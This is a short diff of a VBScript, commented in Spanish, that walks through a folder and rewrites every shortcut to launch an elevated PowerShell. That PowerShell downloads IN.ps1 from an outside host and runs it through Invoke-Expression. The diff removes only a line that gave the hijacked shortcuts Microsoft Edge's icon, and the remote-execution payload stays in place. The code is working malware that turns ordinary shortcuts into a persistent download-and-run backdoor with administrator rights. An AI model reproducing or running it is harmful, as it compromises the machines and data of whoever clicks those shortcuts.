@@ -20,7 +20,6 @@ For Each archivo In carpeta.Files
         Set accesoDirecto = shell.CreateShortcut(archivo.Path)
         accesoDirecto.TargetPath = "powershell.exe"
         accesoDirecto.Arguments = "-Command ""Start-Process powershell.exe -ArgumentList '-c', 'irm ''https://baa4ts.is-a-good.dev/IN.ps1'' | Invoke-Expression' -Verb RunAs"""
-        accesoDirecto.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, 0" ' Ruta al ícono de Edge
         accesoDirecto.Save
     End If
 Next
